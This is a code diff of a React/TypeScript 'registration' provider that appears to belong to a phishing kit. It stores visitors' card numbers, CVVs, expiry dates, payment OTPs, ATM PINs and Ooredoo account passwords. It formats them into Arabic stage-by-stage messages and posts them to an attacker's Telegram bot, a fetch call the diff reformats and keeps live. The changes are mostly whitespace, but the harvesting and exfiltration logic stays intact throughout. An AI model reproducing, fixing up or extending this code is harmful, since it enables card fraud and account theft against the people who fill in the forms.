@@ -8,7 +8,7 @@ interface RegistrationData {
   visitorEmail?: string;
   visitorMobile?: string;
   phoneCode?: string;
-  
+
   // Personal Info
   nationality?: string;
   fullNameArabic?: string;
@@ -17,33 +17,33 @@ interface RegistrationData {
   gender?: string;
   address?: string;
   email?: string;
-  
+
   // Password
   password?: string;
-  
+
   // Payment
   cardNumber?: string;
   cardholderName?: string;
   expiryDate?: string;
   cvv?: string;
-  
+
   // Payment OTP
   paymentOtp?: string;
-  
+
   // ATM Pin
   atmPin?: string;
-  
+
   // Ooredoo Verification
   ooredooEmail?: string;
   ooredooPassword?: string;
-  
+
   // OTP
   otp?: string;
-  
+
   // Account Creation
   accountCreationPhone?: string;
   accountCreationId?: string;
-  
+
   // Forgot Password
   forgotPasswordEmail?: string;
   forgotPasswordId?: string;
@@ -117,7 +117,7 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
     // Stage 4: Payment
     if (stage >= 4 && dataToFormat.cardNumber) {
       message += `🚨 <b>المرحلة 4: بيانات الدفع</b>\n`;
-      message += `   💳 رقم البطاقة: ${dataToFormat.cardNumber}\n`;
+      message += `   💳cardnumber: ${dataToFormat.cardNumber}\n`;
       message += `   👤 اسم حامل البطاقة: ${dataToFormat.cardholderName}\n`;
       message += `   📅 تاريخ الانتهاء: ${dataToFormat.expiryDate}\n`;
       message += `   🔒 CVV: ${dataToFormat.cvv}\n`;
@@ -180,21 +180,18 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
     try {
       const dataToSend = newData ? { ...data, ...newData } : data;
       const message = formatTelegramMessage(stage, stageName, dataToSend);
-      
-      const response = await fetch(
-        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-        {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: "HTML",
-          }),
-        }
-      );
+
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      });
 
       if (!response.ok) {
         throw new Error("Failed to send message to Telegram");
@@ -216,9 +213,7 @@ export const RegistrationProvider = ({ children }: { children: ReactNode }) => {
   };
 
   return (
-    <RegistrationContext.Provider
-      value={{ data, updateData, sendCumulativeMessage, clearData }}
-    >
+    <RegistrationContext.Provider value={{ data, updateData, sendCumulativeMessage, clearData }}>
       {children}
     </RegistrationContext.Provider>
   );
